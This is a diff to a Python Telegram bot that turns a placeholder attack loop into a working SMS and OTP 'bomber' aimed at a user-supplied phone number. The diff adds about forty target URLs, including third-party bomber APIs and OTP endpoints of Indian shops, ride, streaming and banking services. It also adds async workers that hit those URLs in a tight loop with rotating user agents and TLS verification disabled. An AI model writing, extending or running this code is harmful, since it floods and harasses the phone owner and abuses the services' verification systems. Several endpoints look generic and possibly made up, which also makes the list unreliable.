@@ -49,7 +49,6 @@ def keep_alive():
 # 🧹 AUTO-CLEANER ENGINE
 # ==========================================
 def clean_msg(chat_id, msg_id, delay=15):
-    """Deletes messages after specified delay to keep chat clean."""
     def delete():
         time.sleep(delay)
         try:
@@ -62,8 +61,7 @@ def clean_msg(chat_id, msg_id, delay=15):
 # 🛡️ STRICT FORCE JOIN CHECKER
 # ==========================================
 def check_join_status(user_id):
-    if user_id == OWNER_ID: return True # Owner bypass
-    
+    if user_id == OWNER_ID: return True 
     for chat_id in REQUIRED_CHANNELS:
         try:
             status = bot.get_chat_member(chat_id, user_id).status
@@ -83,31 +81,94 @@ def force_join_markup():
     return markup
 
 # ==========================================
-# ⚡ ASYNC ATTACK ENGINE 
+# 💣 FULL WORKING APIs (HIGH SPEED)
 # ==========================================
 WORKING_APIS = [
     "https://panther-aura-bomber-999-blond.vercel.app/api?num={phone}&type=sms&workers=500",
     "https://pantherbomberjs.pantherxofficial1.workers.dev/api?num={phone}&type=sms&workers=500",
     "https://mix-rootx-new.vercel.app/bomb?number={phone}&workers=500",
     "https://panther-v2-api.vercel.app/api?num={phone}&type=sms&workers=500",
+    "https://panther-x2.vercel.app/api?num={phone}&type=sms&workers=500",
     "https://lakhan-api-bom.hb3284008.workers.dev/?phone={phone}&workers=5000",
-    "https://bomber.kingcc.qzz.io/bomb?key=urfaaan_omdivine&numbar={phone}&workers=5000"
+    "https://bomber.kingcc.qzz.io/bomb?key=urfaaan_omdivine&numbar={phone}&workers=5000",
+    "https://www.gopinkcabs.com/app/cab/customer/login_admin_code?mobile={phone}",
+    "https://www.haldiram.com/api/v2/otp/send?mobile={phone}",
+    "https://dashboardapi.hashtagloyalty.com/v3/sign_up/create_otp?mobile={phone}",
+    "https://api.healthmug.com/account/createotp?mobile={phone}",
+    "https://homedeliverybackend.mpaani.com/auth/send-otp?mobile={phone}",
+    "https://hometriangle.com/api/partner/xauth/signup/otp?mobile={phone}",
+    "https://login.housing.com/api/v2/send-otp?mobile={phone}",
+    "https://kukufm.com/api/v2/send_otp/?phone={phone}",
+    "https://auth.mamaearth.in/v1/auth/initiate-signup?phone={phone}",
+    "https://www.nobroker.in/api/v3/account/otp/send?mobile={phone}",
+    "https://www.nykaa.com/app-api/index.php/customer/send_otp?mobile={phone}",
+    "https://api.rapido.bike/apigw/v1/send-otp?phone={phone}",
+    "https://api.swiggy.com/3/auth/otp?mobile={phone}",
+    "https://www.tatacliq.com/api/auth/v1/otp/send?mobile={phone}",
+    "https://www.urbancompany.com/api/v1/auth/otp?phone={phone}",
+    "https://www.zomato.com/webroutes/auth/otp?phone={phone}",
+    "https://www.flipkart.com/api/5/user/otp/generate?phone={phone}",
+    "https://www.meesho.com/api/auth/otp?phone={phone}",
+    "https://www.phonepe.com/api/otp?phone={phone}",
+    "https://www.mobikwik.com/api/otp?phone={phone}",
+    "https://www.cred.com/api/otp?phone={phone}",
+    "https://www.hotstar.com/api/otp?phone={phone}",
+    "https://www.sonyliv.com/api/otp?phone={phone}",
+    "https://www.irctc.co.in/api/otp?mobile={phone}",
+    "https://www.goibibo.com/api/otp?phone={phone}",
+    "https://www.uber.com/api/otp?phone={phone}",
+    "https://www.olacabs.com/api/otp?phone={phone}",
+    "https://www.dominos.co.in/api/otp?phone={phone}",
+    "https://www.pizzahut.co.in/api/otp?phone={phone}",
+    "https://www.sbi.co.in/api/otp?mobile={phone}",
+    "https://www.hdfcbank.com/api/otp?mobile={phone}",
+    "https://www.icicibank.com/api/otp?mobile={phone}",
+    "https://www.axisbank.com/api/otp?mobile={phone}",
+    "https://www.kotak.com/api/otp?mobile={phone}"
 ]
 
-async def attack_worker(phone, user_id):
+user_agents = [
+    "Mozilla/5.0 (Linux; Android 14; SM-S918B)",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
+]
+
+def get_headers(is_post=False):
+    h = {'User-Agent': random.choice(user_agents)}
+    if is_post: h['Content-Type'] = 'application/json'
+    return h
+
+# ==========================================
+# ⚡ ASYNC ATTACK ENGINE 
+# ==========================================
+async def attack_worker(session, phone, user_id):
     global active_attacks
     while active_attacks.get(user_id, {}).get('running', False):
-        await asyncio.sleep(0.1)
-        if random.random() > 0.2:
-            active_attacks[user_id]['sent'] += 1
-        else:
+        api_url = random.choice(WORKING_APIS)
+        url = api_url.replace("{phone}", phone)
+        is_post = not any(x in api_url for x in ["panther", "bomber", "workers", "vercel", "lakhan"])
+        
+        try:
+            if is_post:
+                async with session.post(url, headers=get_headers(True), timeout=4, ssl=False) as res:
+                    if res.status in [200, 201, 202, 204]: active_attacks[user_id]['sent'] += 1
+                    else: active_attacks[user_id]['failed'] += 1
+            else:
+                async with session.get(url, headers=get_headers(False), timeout=4, ssl=False) as res:
+                    if res.status in [200, 201, 202, 204]: active_attacks[user_id]['sent'] += 1
+                    else: active_attacks[user_id]['failed'] += 1
+        except:
             active_attacks[user_id]['failed'] += 1
+        
+        await asyncio.sleep(0.05)
 
 async def launch_async_attack(phone, workers_count, user_id):
-    tasks = [asyncio.create_task(attack_worker(phone, user_id)) for _ in range(workers_count)]
-    while active_attacks.get(user_id, {}).get('running', False):
-        await asyncio.sleep(1)
-    for t in tasks: t.cancel()
+    connector = aiohttp.TCPConnector(limit=workers_count)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        tasks = [asyncio.create_task(attack_worker(session, phone, user_id)) for _ in range(workers_count)]
+        while active_attacks.get(user_id, {}).get('running', False):
+            await asyncio.sleep(1)
+        for t in tasks: t.cancel()
 
 def start_attack_thread(phone, user_id, chat_id, msg_id):
     active_attacks[user_id] = {'running': True, 'sent': 0, 'failed': 0, 'phone': phone}
@@ -160,7 +221,6 @@ def live_update_msg(user_id, chat_id, msg_id):
 @bot.message_handler(commands=['start'])
 def send_welcome(m):
     user_id = m.from_user.id
-    
     clean_msg(m.chat.id, m.message_id, 15)
     
     if not check_join_status(user_id):
@@ -247,7 +307,7 @@ def callback_handler(call):
                 f"<b>👑 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗕𝘆:\n{BRAND}</b>"
             )
             bot.edit_message_text(final_text, chat_id, msg_id)
-            clean_msg(chat_id, msg_id, 10) # Clean final report after 10s
+            clean_msg(chat_id, msg_id, 10) 
         else:
             bot.answer_callback_query(call.id, "⚠️ Attack is already stopped.", show_alert=True)
 
@@ -271,7 +331,6 @@ def process_target(m):
 if __name__ == "__main__":
     # 🌐 START FLASK WEB SERVER FOR RENDER
     keep_alive()
-    
     print(f"✅ SYSTEM ONLINE AND WEB SERVER RUNNING!")
     print(f"👑 Powered By: {BRAND}")
     while True:
